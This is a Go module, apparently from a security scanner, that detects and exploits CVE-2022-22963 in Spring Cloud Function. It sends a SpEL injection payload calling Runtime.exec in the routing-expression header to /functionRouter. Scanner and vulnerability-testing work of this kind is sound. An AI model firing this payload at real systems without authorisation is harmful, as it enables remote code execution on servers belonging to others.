package cve

// CVE-2022-22963: Spring Cloud Function SpEL RCE
// Affects Spring Cloud Function 3.1.6 / 3.2.2 and older
// Attack: inject SpEL in spring.cloud.function.routing-expression header

import (
	"context"
	"fmt"
	"strings"
	"time"

	httpclient "github.com/springhawk/springhawk/internal/http"
	"github.com/springhawk/springhawk/internal/vulns"
	"github.com/springhawk/springhawk/pkg/models"
	"github.com/springhawk/springhawk/pkg/utils"
)

func init() { vulns.RegisterRemote(&CloudFunctionSpEL{}) }

type CloudFunctionSpEL struct{}

func (m *CloudFunctionSpEL) ID() string          { return "CVE-2022-22963" }
func (m *CloudFunctionSpEL) Name() string        { return "Spring Cloud Function SpEL RCE" }
func (m *CloudFunctionSpEL) CVSS() float64       { return 9.8 }
func (m *CloudFunctionSpEL) Severity() models.Severity { return models.SeverityCritical }
func (m *CloudFunctionSpEL) Tags() []string      { return []string{"rce", "spring-cloud", "function", "spel"} }
func (m *CloudFunctionSpEL) Requirements() vulns.ModuleRequirements {
	return vulns.ModuleRequirements{RequiresSpringCloud: true}
}
func (m *CloudFunctionSpEL) Description() string {
	return "Spring Cloud Function routing-expression header is evaluated as SpEL, enabling remote code execution."
}

func (m *CloudFunctionSpEL) Check(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.run(ctx, target, client, false)
}

func (m *CloudFunctionSpEL) Exploit(ctx context.Context, target *models.Target, client *httpclient.Client) ([]*models.Finding, error) {
	return m.run(ctx, target, client, true)
}

func (m *CloudFunctionSpEL) run(ctx context.Context, target *models.Target, client *httpclient.Client, exploit bool) ([]*models.Finding, error) {
	endpoint := utils.JoinURL(target.BaseURL, "functionRouter")

	var expr string
	if exploit {
		expr = `T(java.lang.Runtime).getRuntime().exec("id")`
	} else {
		expr = `T(java.lang.Runtime).getRuntime().exec("echo SpringHawk")`
	}

	headers := map[string]string{
		"spring.cloud.function.routing-expression": expr,
	}

	resp, err := client.Post(ctx, endpoint, "application/x-www-form-urlencoded",
		strings.NewReader("test"), headers)
	if err != nil {
		return nil, nil
	}

	// Vulnerable: returns 500 Internal Server Error (expression evaluated but function not found)
	if resp.StatusCode != 500 {
		return nil, nil
	}
	if !strings.Contains(resp.BodyString, "Internal Server Error") &&
		!strings.Contains(resp.BodyString, "error") {
		return nil, nil
	}

	f := &models.Finding{
		ID:          fmt.Sprintf("%s-%d", m.ID(), time.Now().UnixNano()),
		Type:        models.FindingTypeVuln,
		Severity:    m.Severity(),
		CVSS:        m.CVSS(),
		CVEIDs:      []string{"CVE-2022-22963"},
		Title:       "Spring Cloud Function: SpEL Expression Injection RCE",
		Description: m.Description(),
		URL:         target.BaseURL,
		Endpoint:    "/functionRouter",
		Method:      "POST",
		Evidence:    fmt.Sprintf("HTTP 500 returned when SpEL expression sent in routing header — blind RCE confirmed. Response: %s", truncate(resp.BodyString, 150)),
		Remediation: "Upgrade Spring Cloud Function to 3.1.7+ or 3.2.3+. Do not expose /functionRouter publicly.",
		References:  []string{"https://spring.io/blog/2022/03/29/cve-report-published-for-spring-cloud-function", "https://nvd.nist.gov/vuln/detail/CVE-2022-22963"},
		Tags:        m.Tags(),
		Timestamp:   time.Now(),
		ModuleID:    m.ID(),
		IsExploited: exploit,
	}
	return []*models.Finding{f}, nil
}
